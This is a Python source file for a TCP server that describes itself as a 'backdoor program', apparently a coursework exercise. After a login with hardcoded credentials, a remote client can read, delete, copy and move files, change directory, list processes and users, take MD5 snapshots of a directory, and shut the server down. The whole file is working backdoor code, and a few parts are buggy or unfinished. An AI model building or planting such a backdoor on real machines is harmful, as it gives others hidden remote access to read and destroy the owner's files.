import socketserver
import socket, threading
import hashlib
import sys
import subprocess
import os


class MyTCPHandler(socketserver.BaseRequestHandler):
    BUFFER_SIZE = 4096

    #Hardcoded credentials
    __USERNAME = "bossy"
    __PASSCODE = "passycody"

    #Boolean used to close server if user triggers off command
    closeServer = False


    def handle(self):

        #Handshake (check if user enters correct username and password
        try:

            self.request.sendall(bytearray("Give me your username!\n", "utf-8"))
            username = self.request.recv(self.BUFFER_SIZE)

            username = username.decode("utf-8")
            username = username.strip()

            self.request.sendall(bytearray("Now the password!\n", "utf-8"))
            password = self.request.recv(self.BUFFER_SIZE)

            password = password.decode("utf-8")
            password = password.strip()

            if username == self.__USERNAME and password == self.__PASSCODE:

                self.request.sendall(bytearray("SUCCESS!\n", "utf-8"))

            else:
                self.request.sendall(bytearray("Wrong username or password\n", "utf-8"))
                quit()


        except:

            #Quit current thread if user disconnects without authenticating first (not using logout)
            quit()


        while 1:
            data = self.request.recv(self.BUFFER_SIZE)

            if len(data) == self.BUFFER_SIZE:
                while 1:

                    try:  # error means no more data
                        data += self.request.recv(self.BUFFER_SIZE, socket.MSG_DONTWAIT)

                    except:
                        break

            if len(data) == 0:
                break

            data = data.decode("utf-8")

            # Remove leading and trailing spaces
            data = data.strip()
            print(data)

            if data == "help":
                self.request.sendall(bytearray(
                    "The supported commands are pwd, cd, ls, cp, rm, mv, cat, snap, diff, logout, off, help <command>, who, net, ps, uptime\n",
                    "utf-8"))

            elif data[0:5] == "help ":

                # Strip any spaces in-between help and command
                command = str.strip(data[5:])

                # Check which command the user is seeking info on and return info on it
                if command == "pwd":
                    self.request.sendall(bytearray("pwd - returns the current working directory\n", "utf-8"))

                elif command == "cd":
                    self.request.sendall(
                        bytearray("cd <dir> - change the current working directory to <dir>\n", "utf-8"))

                elif command == "ls":
                    self.request.sendall(
                        bytearray("ls - list the contents of the current working directory\n", "utf-8"))

                elif command == "cp":
                    self.request.sendall(bytearray("cp <file1> <file2> - copy file 1 to file 2\n", "utf-8"))

                elif command == "rm":
                    self.request.sendall(bytearray("rm <file> - delete file\n", "utf-8"))

                elif command == "mv":
                    self.request.sendall(bytearray("mv <file1> <file2> - rename file1 to file2\n", "utf-8"))

                elif command == "cat":
                    self.request.sendall(bytearray("cat <file> - return contents of file\n", "utf-8"))

                elif command == "snap":
                    self.request.sendall(bytearray(
                        "snap - take a snapshot of all the files in the current directory and save it in memory\n",
                        "utf-8"))

                elif command == "diff":
                    self.request.sendall(bytearray(
                        "diff - compare the contents of the current directory to the saved snapshot, and report differences (deleted files, changed files and new files\n",
                        "utf-8"))

                elif command == "logout":
                    self.request.sendall(bytearray("logout - disconnect client\n", "utf-8"))

                elif command == "off":
                    self.request.sendall(bytearray("off - terminate the backdoor program\n", "utf-8"))

                elif command == "who":
                    self.request.sendall(bytearray("who - list user(s) currently logged in\n", "utf-8"))

                elif command == "net":
                    self.request.sendall(bytearray("net - show current networking configuration\n", "utf-8"))

                elif command == "ps":
                    self.request.sendall(bytearray("ps - show currently running processes\n", "utf-8"))

                elif command == "uptime":
                    self.request.sendall(bytearray("uptime - the amount of time the device has been on for\n", "utf-8"))

                else:
                    self.request.sendall(bytearray("No help command for " + command + "\n", "utf-8"))


            elif data == "ls":
                # Run a subprocess in shell that returns output of ls -l into variable
                output = subprocess.run(['ls', '-l'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

                # Decode the shell command result into a string format
                lsCommand = output.stdout.decode("utf-8")

                # Send the string output to the client
                self.request.sendall(bytearray(lsCommand, "utf-8"))

            elif data == "pwd":

                # Run a subprocess in shell that returns output of pwd into variable
                output = subprocess.run(['pwd'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

                # Decode the shell command result into a string format
                pwdCommand = output.stdout.decode("utf-8")

                # Send the string output to the client
                self.request.sendall(bytearray(pwdCommand, "utf-8"))

                # If cat command is given without any parameters, display usage error
            elif data == "cat":
                self.request.sendall(bytearray("USAGE: cat <file>\n", "utf-8"))

            elif data[0:4] == "cat ":

                # Strip any spaces in-between cat and command
                command = str.strip(data[4:])

                try:

                    print("INSIDE COMMAND: " + command)
                    # Run a subprocess in shell that returns output of cat into variable
                    output = subprocess.run(['cat', command], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

                    # Decode the shell command result into a string format
                    catCommand = output.stdout.decode("utf-8")

                    # Send the string output to the client
                    self.request.sendall(bytearray(catCommand, "utf-8"))

                except:

                    print("FileNotFoundError")


            elif data == "who":

                # Run a subprocess in shell that returns output of who into variable
                output = subprocess.run(['who'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

                # Decode the shell command result into a string format
                whoCommand = output.stdout.decode("utf-8")

                # Send the string output to the client
                self.request.sendall(bytearray(whoCommand, "utf-8"))

            elif data == "net":

                # Run a subprocess in shell that returns output of net into variable
                output = subprocess.run(['net'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

                # Decode the shell command result into a string format
                netCommand = output.stdout.decode("utf-8")

                # Send the string output to the client
                self.request.sendall(bytearray(netCommand, "utf-8"))

            elif data == "ps":

                # Run a subprocess in shell that returns output of ps into variable
                output = subprocess.run(['ps'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

                # Decode the shell command result into a string format
                psCommand = output.stdout.decode("utf-8")

                # Send the string output to the client
                self.request.sendall(bytearray(psCommand, "utf-8"))

            elif data == "uptime":

                # Run a subprocess in shell that returns output of uptime into variable
                output = subprocess.run(['uptime'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

                # Decode the shell command result into a string format
                uptimeCommand = output.stdout.decode("utf-8")

                # Send the string output to the client
                self.request.sendall(bytearray(uptimeCommand, "utf-8"))

            # If cd command is given without any parameters, display usage error
            elif data == "cd":
                self.request.sendall(bytearray("USAGE: cd <dir>\n", "utf-8"))

            elif data[0:3] == "cd ":

                # Strip any spaces in-between cd and command
                command = str.strip(data[3:])

                try:

                    # Change the current directory based on the provided argument
                    os.chdir(command)

                    # Indicate successful cd to client
                    self.request.sendall(bytearray("Success!\n", "utf-8"))

                except:

                    self.request.sendall(bytearray("cd: " + command + ": No such file or directory\n", "utf-8"))
                    # If cat command is given without any parameters, display usage error

            elif data == "rm":
                self.request.sendall(bytearray("USAGE: rm <file>\n", "utf-8"))

            elif data[0:3] == "rm ":

                # Strip any spaces in-between cat and command
                command = str.strip(data[3:])

                try:

                    # Run a subprocess in shell that returns output of rm into variable
                    output = subprocess.run(['rm', command], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

                    # Decode the shell command result into a string format
                    rmCommand = output.stdout.decode("utf-8")

                    # Send the string output to the client
                    self.request.sendall(bytearray(rmCommand, "utf-8"))

                except:

                    self.request.sendall(bytearray("rm: " + command + ": No such file or directory\n", "utf-8"))

            elif data == "cp":
                self.request.sendall(bytearray("USAGE: cp <file1> <file2>\n", "utf-8"))

            elif data[0:3] == "cp ":

                # Strip any spaces in-between cat and command
                arguments = str.strip(data[3:])

                # Find first whitespace in-between arguments (if two arguments provided)
                arguments = arguments.split()

                # If the arguments given are greater than two, or less than two, give usage error
                if len(arguments) < 2 or len(arguments) > 2:

                    self.request.sendall(
                        bytearray("Error: invalid amount of arguments, cp takes two arguments\n", "utf-8"))
                    self.request.sendall(bytearray("USAGE: cp <file1> <file2>\n", "utf-8"))

                else:

                    # Run a subprocess in shell that returns output of cp into variable
                    output = subprocess.run(['cp', arguments[0], arguments[1]], stdout=subprocess.PIPE,
                                            stderr=subprocess.STDOUT)

                    # Decode the shell command result into a string format
                    cpCommand = output.stdout.decode("utf-8")

                    # Send the string output to the client
                    self.request.sendall(bytearray(cpCommand, "utf-8"))

            elif data == "mv":
                self.request.sendall(bytearray("USAGE: mv <file1> <file2>\n", "utf-8"))

            elif data[0:3] == "mv ":

                # Strip any spaces in-between cat and command
                arguments = str.strip(data[3:])

                # Find first whitespace in-between arguments (if two arguments provided)
                arguments = arguments.split()

                # If the arguments given are greater than two, or less than two, give usage error
                if len(arguments) < 2 or len(arguments) > 2:

                    self.request.sendall(
                        bytearray("Error: invalid amount of arguments, mv takes two arguments\n", "utf-8"))
                    self.request.sendall(bytearray("USAGE: mv <file1> <file2>\n", "utf-8"))

                else:

                    # Run a subprocess in shell that returns output of cp into variable
                    output = subprocess.run(['mv', arguments[0], arguments[1]], stdout=subprocess.PIPE,
                                            stderr=subprocess.STDOUT)

                    # Decode the shell command result into a string format
                    mvCommand = output.stdout.decode("utf-8")

                    # Send the string output to the client
                    self.request.sendall(bytearray(mvCommand, "utf-8"))


            elif data == "snap":

                # Remove old snapshot
                subprocess.run(['rm', "snapshot.txt"], stdout=subprocess.PIPE,
                               stderr=subprocess.STDOUT)

                # Open new snapshot file with write permission
                new_snap = open('snapshot.txt', 'w')

                # Get the current working directory (as string)
                curr_directory = os.getcwd()

                # For each in the listed current directory, we create a hash digest
                for file in os.listdir(curr_directory):

                    if os.path.isfile(file):

                        # Generates an md5 hash algorithm
                        MD5 = hashlib.md5()

                        # Open current the current file as hashable
                        with open(file, 'rb') as hashable:

                            # Update the hash object MD5 with the data read from hashable
                            read_in = hashable.read()
                            MD5.update(read_in)

                            # Write filename and digest to new file

                            if file != 'snapshot.txt':
                                new_snap.write(file + "\n" + MD5.hexdigest() + "\n")

                        hashable.close()

                new_snap.close()

            elif data == "diff":

                if os.path.isfile("snapshot.txt"):

                    snapshot = []

                    with open('snapshot.txt', 'r') as snapfile:
                        for line in snapfile:

                            line = line.strip()

                            snapshot.append(line)

                    snapfile.close()


                    diffshot = []

                    # Get the current working directory (as string)
                    curr_directory = os.getcwd()

                    # For each in the listed current directory, we create a hash digest
                    for file in os.listdir(curr_directory):

                        if os.path.isfile(file):

                            # Generates an md5 hash algorithm
                            MD5 = hashlib.md5()

                            # Open current the current file as hashable
                            with open(file, 'rb') as hashable:
                                # Update the hash object MD5 with the data read from hashable
                                read_in = hashable.read()
                                MD5.update(read_in)

                                # save snap in array (filename and hex digest)
                                if file != 'snapshot.txt':
                                    diffshot.append(file)
                                    diffshot.append(MD5.hexdigest())

                            hashable.close()

                    counter = 0
                    while (counter < len(snapshot)):
                        print("SNAPSHOT: " + snapshot[counter])
                        counter+=1

                    counter = 0
                    while (counter < len(diffshot)):
                        print("CUMMIES: " + diffshot[counter])
                        counter+=1

                    #if file is in diffshot, but not snapshot, file is added
                    #if file is in snapshot, but not diffshot, file is deleted
                    #if file has different hash, file is modified
                    outerCounter = 0
                    while outerCounter < len(diffshot):
                        innerCounter = 0
                        while innerCounter < len(snapshot):
                            if diffshot[outerCounter] == snapshot[innerCounter]:
                                break
                            innerCounter = innerCounter + 2
                            if innerCounter == len(snapshot):
                                print (diffshot[outerCounter] + ' has been added' + '\n' )

                        outerCounter = outerCounter + 2



                    outerCounter = 0
                    while outerCounter < len(snapshot):
                        innerCounter = 0
                        while innerCounter < len(diffshot):
                            if diffshot[innerCounter] == snapshot[outerCounter] \
                                    and diffshot[innerCounter + 1] != snapshot[outerCounter + 1]:

                                print(diffshot[innerCounter] + ' has been modified' + '\n')

                            innerCounter = innerCounter + 2

                        outerCounter = outerCounter + 2

                    outerCounter = 0
                    while outerCounter < len(snapshot):
                        innerCounter = 0
                        while innerCounter < len(diffshot):
                            if snapshot[outerCounter] == diffshot[innerCounter]:
                                break
                            innerCounter = innerCounter + 2
                            if innerCounter == len(diffshot):
                                print(snapshot[outerCounter] + ' has been deleted' + '\n')

                        outerCounter = outerCounter + 2





                else:

                    self.request.sendall(bytearray("Error: no snapshot in current directory\n", "utf-8"))



            elif data == "logout":

                # Disconnect the client from the server
                self.request.sendall(bytearray("You have logged out of the server\n", "utf-8"))

                # Break out of the while loop for the client thread, disconnecting the client
                break

            elif data == "off":
                # Set close server flag
                self.closeServer = True
                # Break out of while loop, shutting off server
                break

        if self.closeServer == True:
            # Tell the serve_forever() loop to stop (shut down server)
            server.shutdown()

            # Clean up the server
            server.server_close()

            os._exit(0)


if __name__ == "__main__":
    HOST = "localhost"
    PORT = int(sys.argv[1])
    server = socketserver.ThreadingTCPServer((HOST, PORT), MyTCPHandler)
    server.serve_forever()
